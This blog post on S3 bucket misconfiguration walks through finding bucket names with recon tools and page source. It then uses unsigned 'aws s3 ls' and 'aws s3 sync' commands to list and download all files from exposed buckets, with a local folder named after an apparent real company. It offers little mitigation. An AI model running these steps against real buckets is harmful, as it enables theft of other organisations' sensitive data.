---
title: "S3 Bucket Misconfiguration"
seoTitle: "S3 Bucket Security Risk"
seoDescription: "A guide to securing AWS S3 buckets, identifying and mitigating misconfigurations to protect sensitive data from potential attackers"
datePublished: Fri Sep 13 2024 14:30:54 GMT+0000 (Coordinated Universal Time)
cuid: cm10tg56b005f09lacza0ho8t
slug: s3-bucket-misconfiguration
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1726236553275/cb5608a0-903c-4bd2-acc9-1de55b77666a.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1726237781284/0d9e6e7e-f733-43c8-9711-55056dcc94ff.png
tags: aws, aws-cli, s3-cli, s3-bucket, aws-s3-misconfiguration

---

# Agenda

Today we are going to check s3 bucket security:

1. Install **aws-cli** and config aws credentials using the command:
    
    ```bash
    aws configure
    ```
    
2. Create a python script to list out the s3-buckets (This is for blue team for security or you can skip this part otherwise) :
    
    ```bash
    import boto3
    s3 = boto3.resource('s3')
    for bucket in s3.buckets.all():
            print(bucket.name)
    ```
    
    * You'll get list of AWS s3 buckets on your AWS account.
        
3. As a curious attacker, we are going to exploit this:
    
    * Try to url grabbing using waybackurls, dirsearch or anything or just checkout the source code.
        
    * You might get the files link from the source code too open the files.
        
    * Simply, open the image on the webapp, you may get the s3 bucket name from all these process.
        
    
    # Let’s dig more now.
    
4. Try using this method, if you already got s3-bucket name
    
    [https://s3.ap-south-1.amazonaws.com/$s3-bucketname](https://s3.ap-south-1.amazonaws.com/$s3-bucketname)
    
    * If the s3 bucket is misconfiguration, it will display all data with documents on the page.
        
    * If the s3 bucket is configured, it will show access denied to third party.
        
5. List out all files in the s3 bucket:
    
    ```bash
    aws s3 ls s3://$bucket_name/ --no-sign-request --region ap-south-1
    ```
    
6. Download all s3 bucket files from s3 to [localhost](http://localhost) using awscli:
    
    ```bash
    aws s3 sync s3://$bucket_name/ ~/Documents/HiCare --no-sign-request --region ap-south-1
    ```
    
7. Now this is how we can get many sensitive data from the company. This may lead to huge risk to the company.
    

### Conclusion:

### `The goal of this testing is to secure the AWS S3 bucket from attackers. If an organisation's data is leaked, it can lead to a very critical situation for the company.`

[  
](https://devsecops.abisec.xyz/cloud-security-resources)